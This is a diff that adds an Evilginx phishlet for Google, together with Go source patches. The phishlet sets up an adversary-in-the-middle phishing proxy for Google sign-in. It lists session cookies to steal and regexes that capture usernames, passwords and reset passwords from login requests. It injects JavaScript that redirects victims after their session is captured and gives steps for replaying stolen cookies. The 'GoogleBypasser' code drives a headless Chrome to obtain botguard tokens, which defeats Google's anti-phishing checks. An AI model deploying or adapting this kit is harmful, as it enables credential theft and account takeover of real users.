@@ -1,0 +1,490 @@
+# Disclaimer : 
+# 1. Make sure to modify the evilginx source to make the google work. Check the modified source code at the end of this file.
+# 2. Some google functionality may not work because it requires some GET Parameters to remain unmodified but evilginx by default modifies all GET Parameters links. To avoid any broken functionalities, phishlet is redirecting used after a successfull session token detected. You can modify the redirect by setting "targetDomain" in js or this can also be done from lure by setting "targetDomain = '{redirect-url}'" and defining "redirect-url" during lure creation.
+# 3. js_inject might not trigger correctly with evilginx3 , To make js_inject work in v3.0 evilginx, Make sure to do these changes (https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
+# 4. Session cookies injection is kinda tricky a wrong injection may invalidate the session, Check below cookies injection method worked for me.
+
+name: 'Google'
+author: '@an0nud4y'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+
+
+sub_filters:
+# (In case js_inject don't works) Redirect on desired url (replace targetDomain) if successful login occurs by detecting valid session cookies
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
+
+
+# Goback if browser not support issues occurs for some reason
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
+
+# Fixing Forget Password Actions
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var isListenerAdded = false, intervalID = setInterval(() => (!document.body.innerText.includes("You can update your password now if you forgot it.") ? (console.warn("Required text not found. Operations aborted."), isListenerAdded = true) : window.location.href.includes("/changepassword") ? ((button = document.querySelectorAll("button[type=\"button\"]")[1]) && button.innerText === "Update password" ? (console.log("On the way to add Listener ..."), button.addEventListener("click", () => window.location.href.includes("/changepassword") && setTimeout(() => location.reload(), 2000)), console.log("Event listener added to the button."), isListenerAdded = true) : !isListenerAdded ? (console.warn("Button not found. Retrying in 500ms."), setTimeout(() => addButtonEventListener(), 500)) : null) : console.warn("URL does not match. Operations aborted."), isListenerAdded && clearInterval(intervalID)), 500);</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+  
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+
+# Injecting Google Session cookies
+# - Go to google.com
+# - Delete cookies
+# - then import cookies
+# - then refresh and go to account.google.com or mail.google.com
+# - then click on sign in
+# - then insert cookies
+# - and then refresh page and if not logged in insert cookies again and wait for it to automatically detect or refresh.
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    # Updated_Password after password reset
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]' 
+      type: 'post'
+
+
+# Force GET - By default evilginx will modify all the domain URLs in GET Parameters which breaks some of the google functionality. Hence we need a Feature FORCE GET same as FORCE POST to modify the GET Parameters on the Fly. This can be also achieved by modifying the proxy.go file code for specific cases, But for generalized implementation Force GET feature would be better solution.
+
+# Get Parameters at below URL GET Requests are also has to be fixed in order to completely fix the google phishlet. For now its performing some redirects to avoid broken requests.
+
+# https://accounts.google.com/SignOutOptions?hl=en&continue=https://myaccount.google.com/%3Fpli%3D1%26utm_source%3Dsign_in_no_continue&ec=GBRAwAE
+# https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&hl=en&checkedDomains=youtube&pstMsg=1&flowName=GlifWebSignIn&ifkv=Af_xneGCEkLu6gkoKlJZTXE3KXLOwxAnakKqQdVySZALt605-KszqbxQ0rMNOFS7KQ-c7oUu8ii5ZQ&chtml=LoginDoneHtml&gidl=EgIIAA
+# At this above url "continue" parameter has to be fixed to original.
+
+# https://accounts.google.com/RotateCookiesPage?og_pid=192&rot=3&origin=https%3A%2F%2Fmyaccount.google.com&exp_id=3701180
+# https://myaccount.google.com/profile-picture?origin=https%3A%2F%2Fmyaccount.google.com&hostId=ma&theme=light
+# https://ogs.google.com/u/0/widget/account?amf=1&sea=1&origin=https%3A%2F%2Fmyaccount.google.com&cn=account&pid=269&spid=192
+# "origin" parameter here
+
+# https://accounts.google.com/v3/signin/_/AccountsSignInUi/jserror?script=https%3A%2F%2Faccounts.google.com%2Fv3%2Fsignin%2Fidentifier%3Fdsh%3DS1191604103%253A1688217227804093%26flowEntry%3DServiceLogin%26flowName%3DGlifWebSignIn%26hl%3Den%26ifkv%3DAeDOFXg67kiWubFUSHU6sApYqZnTZI3YeDi9EZLK57WXacrsipRvu2kFKMGeJjsp-VYVPM6G-uvoCg&error=%24%20is%20not%20defined&line=177
+# "script" parameter here
+
+
+force_post:
+# https://accounts.google.com/_/signin/selectchallenge?hl=en&TL=AG7eRGB2-SZJFBR2JnUScncEPZlLcKjbvfkegVpvSE25DnahfIioRPDnf8tCIwGv&_reqid=77650&rt=j
+# https://accounts.google.com/_/signin/challenge?hl=en&TL=AG7eRGB5pPAqRiQLRWrxaZSQVNHcQGXcLXqPPxP-Dr6j-QYlITw9Y2zI-tEww6hl&_reqid=178518&rt=j
+# https://accounts.google.com/_/speedbump/changepassword?hl=en&TL=AG7eRGATorowZWWmA0AKwBrJhabhAmltjCD863PUmrEDR-2topZwstTMwNN4DrPL&_reqid=480805&rt=j
+
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+# To make js_inject work in v3.0 evilginx, Make sure to do these changes (https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
+# in file core/phishlet.go on line 909
+# replace line -  re, err := regexp.Compile("^" + d + "$")
+# with line -     re, err := regexp.Compile(d)
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/' , '/changepassword', '/signin']
+    script: |
+        //----------------Redirection on success login--------------------
+        var redirectCount = 0;
+        var maxRedirects = 3;
+        //var targetDomain = '{redirect-url}';
+        var targetDomain = 'https://google.com'; // Update with the target domain
+        function checkCookies() {
+            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+                if (window.location.hostname !== targetDomain) {
+                    window.location.href = targetDomain;
+                } else {
+                    cancelAnimationFrame(animationId);
+                }
+            } else {
+                redirectCount++;
+                if (redirectCount >= maxRedirects) {
+                    cancelAnimationFrame(animationId);
+                }
+            }
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            // Call the checkCookies function at the start
+            checkCookies();
+            // Continue to call checkCookies before each repaint
+            animationId = requestAnimationFrame(function repeat() {
+                checkCookies();
+                animationId = requestAnimationFrame(repeat);
+            });
+        });
+
+
+
+## Modification in evilginx source code to add evilpuppet for google
+
+# 1. Add core/evilpuppet.go file in /core/evilpuppet.go , Before is the source code of the file.
+# 2. Modify core/http_proxy.go file at line  848 (below force post code)
+# 3. Modify main.go file and add below mentioned code ( after showad() function )
+
+# 1. Code : evilpuppet.go
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# // To configure everything just run this single one liner command
+# // sudo apt update && sudo apt install -y xvfb google-chrome-stable && Xvfb :99 -screen 0 1920x1080x24 & export DISPLAY=:99
+
+# package core
+
+# import (
+# 	"bytes"
+# 	"encoding/json"
+# 	"fmt"
+# 	"net/http"
+# 	"net/url"
+# 	"regexp"
+# 	"strings"
+# 	"sync"
+# 	"time"
+
+# 	"github.com/go-rod/rod"
+# 	"github.com/go-rod/rod/lib/input"
+# 	"github.com/go-rod/rod/lib/proto"
+# 	"github.com/kgretzky/evilginx2/log"
+# )
+
+# type GoogleBypasser struct {
+# 	browser        *rod.Browser
+# 	page           *rod.Page
+# 	isHeadless     bool
+# 	withDevTools   bool
+# 	slowMotionTime time.Duration
+
+# 	token string
+# 	email string
+# }
+
+# var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)
+
+# // func (b *GoogleBypasser) Launch() {
+# // 	log.Debug("[GoogleBypasser]: : Launching Browser .. ")
+# // 	u := launcher.New().
+# // 		Headless(b.isHeadless).
+# // 		Devtools(b.withDevTools).
+# // 		NoSandbox(true).
+# // 		MustLaunch()
+# // 	b.browser = rod.New().ControlURL(u)
+# // 	if b.slowMotionTime > 0 {
+# // 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
+# // 	}
+# // 	b.browser = b.browser.MustConnect()
+# // 	b.page = stealth.MustPage(b.browser)
+# // }
+
+# func getWebSocketDebuggerURL() (string, error) {
+# 	resp, err := http.Get("http://127.0.0.1:9222/json")
+# 	if err != nil {
+# 		return "", err
+# 	}
+# 	defer resp.Body.Close()
+
+# 	var targets []map[string]interface{}
+# 	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
+# 		return "", err
+# 	}
+
+# 	if len(targets) == 0 {
+# 		return "", fmt.Errorf("no targets found")
+# 	}
+
+# 	// Return the WebSocket debugger URL of the first target
+# 	return targets[0]["webSocketDebuggerUrl"].(string), nil
+# }
+
+# // Use https://bot.sannysoft.com/ to test the Headless Browser detection. Just open that url in automated browser and check result.
+
+# func (b *GoogleBypasser) Launch() {
+# 	log.Debug("[GoogleBypasser]: Launching Browser .. ")
+
+# 	wsURL, err := getWebSocketDebuggerURL()
+# 	if err != nil {
+# 		log.Error("Failed to get WebSocket debugger URL: %v", err)
+# 	}
+
+# 	b.browser = rod.New().ControlURL(wsURL)
+# 	if b.slowMotionTime > 0 {
+# 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
+# 	}
+
+# 	// Connect to the browser
+# 	b.browser = b.browser.MustConnect()
+
+# 	// Create a new page
+# 	b.page = b.browser.MustPage()
+
+# 	log.Debug("[GoogleBypasser]: Browser connected and page created.")
+# }
+
+# func (b *GoogleBypasser) GetEmail(body []byte) {
+# 	//exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
+# 	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
+# 	email_match := exp.FindSubmatch(body)
+# 	matches := len(email_match)
+# 	if matches < 2 {
+# 		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
+# 		return
+# 	}
+# 	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
+# 	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
+# 	log.Debug("[GoogleBypasser]: Using email to obtain valid token : %v", b.email)
+# }
+
+# func (b *GoogleBypasser) GetToken() {
+# 	stop := make(chan struct{})
+# 	var once sync.Once
+# 	timeout := time.After(200 * time.Second)
+
+# 	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
+# 		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=V1UmUe") {
+
+# 			// Decode URL encoded body
+# 			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
+# 			if err != nil {
+# 				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
+# 				return
+# 			}
+# 			b.token = bgRegexp.FindString(decodedBody)
+# 			log.Debug("[GoogleBypasser]: Obtained Token : %v", b.token)
+# 			once.Do(func() { close(stop) })
+# 		}
+# 	})()
+
+# 	log.Debug("[GoogleBypasser]: Navigating to Google login page ...")
+# 	err := b.page.Navigate("https://accounts.google.com/")
+# 	if err != nil {
+# 		log.Error("Failed to navigate to Google login page: %v", err)
+# 		return
+# 	}
+
+# 	log.Debug("[GoogleBypasser]: Waiting for the email input field ...")
+# 	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
+# 	if emailField == nil {
+# 		log.Error("Failed to find the email input field")
+# 		return
+# 	}
+
+# 	err = emailField.Input(b.email)
+# 	if err != nil {
+# 		log.Error("Failed to input email: %v", err)
+# 		return
+# 	}
+# 	log.Debug("[GoogleBypasser]: Entered target email : %v", b.email)
+
+# 	err = b.page.Keyboard.Press(input.Enter)
+# 	if err != nil {
+# 		log.Error("Failed to submit the login form: %v", err)
+# 		return
+# 	}
+# 	log.Debug("[GoogleBypasser]: Submitted Login Form ...")
+
+# 	//<-stop
+# 	select {
+# 	case <-stop:
+# 		// Check if the token is empty
+# 		for b.token == "" {
+# 			select {
+# 			case <-time.After(1 * time.Second): // Check every second
+# 				log.Printf("[GoogleBypasser]: Waiting for token to be obtained...")
+# 			case <-timeout:
+# 				log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
+# 				return
+# 			}
+# 		}
+# 		//log.Printf("[GoogleBypasser]: Successfully obtained token: %v", b.token)
+# 		// Close the page after obtaining the token
+# 		err := b.page.Close()
+# 		if err != nil {
+# 			log.Error("Failed to close the page: %v", err)
+# 		}
+# 	case <-timeout:
+# 		log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
+# 		return
+# 	}
+# }
+
+# func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
+# 	log.Debug("[GoogleBypasser]: Old body : %v", string(body))
+# 	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
+# 	log.Debug("[GoogleBypasser]: New body : %v", newBody)
+# 	return []byte(newBody)
+# }
+
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+# 2. Code : http_proxy.go ( added some extra code from original source code to figure out the correct line)
+
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+				# 		// google botguard patch
+				# 		if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
+				# 			log.Debug("GoogleBypass working with: %v", req.RequestURI)
+
+				# 			// Decode URL encoded body
+				# 			decodedBody, err := url.QueryUnescape(string(body))
+				# 			if err != nil {
+				# 				log.Error("Failed to decode body: %v", err)
+				# 			}
+				# 			decodedBodyBytes := []byte(decodedBody)
+				# 			b := &GoogleBypasser{
+				# 				isHeadless:     false,
+				# 				withDevTools:   false,
+				# 				slowMotionTime: 1500,
+				# 			}
+				# 			b.Launch()
+				# 			b.GetEmail(decodedBodyBytes)
+				# 			b.GetToken()
+				# 			decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
+
+				# 			// Re-encode the body as form data
+				# 			postForm, err := url.ParseQuery(string(decodedBodyBytes))
+				# 			if err != nil {
+				# 				log.Error("Failed to parse form data: %v", err)
+				# 			}
+				# 			body = []byte(postForm.Encode())
+				# 			req.ContentLength = int64(len(body))
+				# 		}
+
+				# 		req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				# 	}
+				# }
+
+				# // check if request should be intercepted
+				# if pl != nil {
+				# 	if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+				# 		for _, ic := range pl.intercept {
+				# 			//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+				# 			//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+				# 			if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+				# 				return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+				# 			}
+				# 		}
+				# 	}
+				# }
+
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# 3. Code : main.go ( added some extra code from original source code to figure out the correct line)
+#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# func showAd() {
+# 	lred := color.New(color.FgHiRed)
+# 	lyellow := color.New(color.FgHiYellow)
+# 	white := color.New(color.FgHiWhite)
+# 	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
+# 	log.Info("%s", message)
+# }
+
+# var google_bypass = flag.Bool("google-bypass", false, "Enable Google Bypass")
+# func init() {
+# 	flag.Parse()
+# 	if *google_bypass {
+# 		// Ensure the DISPLAY environment variable is set
+# 		display := ":99"
+# 		if disp := getenv("DISPLAY", ""); disp != "" {
+# 			display = disp
+# 		}
+
+# 		// Kill any existing Chrome instances with remote debugging on port 9222
+# 		exec.Command("pkill", "-f", "google-chrome.*--remote-debugging-port=9222").Run()
+# 		log.Debug("Killed all google-chrome instances running in debug mode on port 9222")
+
+# 		// Start google-chrome in debug mode
+# 		cmd := exec.Command("google-chrome", "--remote-debugging-port=9222", "--no-sandbox")
+
+# 		// Capture standard output and error
+# 		var out bytes.Buffer
+# 		var stderr bytes.Buffer
+# 		cmd.Stdout = &out
+# 		cmd.Stderr = &stderr
+
+# 		// Set environment variables if necessary (e.g., DISPLAY)
+# 		cmd.Env = append(cmd.Env, fmt.Sprintf("DISPLAY=%s", display))
+
+# 		err := cmd.Start()
+# 		if err != nil {
+# 			log.Error("Failed to start google-chrome in debug mode: %v", err)
+# 			log.Error("Command output: %s", stderr.String())
+# 			return
+# 		}
+# 		log.Debug("Started google-chrome in debug mode on port 9222")
+
+# 		// Optionally wait for the command to finish and capture its output
+# 		go func() {
+# 			err = cmd.Wait()
+# 			if err != nil {
+# 				log.Error("google-chrome process exited with error: %v", err)
+# 				log.Error("Command output: %s", stderr.String())
+# 			}
+# 		}()
+# 		// Ensure a browser instance is available
+# 		launcher.NewBrowser().MustGet()
+# 	}
+# }
+
+# func getenv(key, fallback string) string {
+# 	value := os.Getenv(key)
+# 	if value == "" {
+# 		return fallback
+# 	}
+# 	return value
+# }
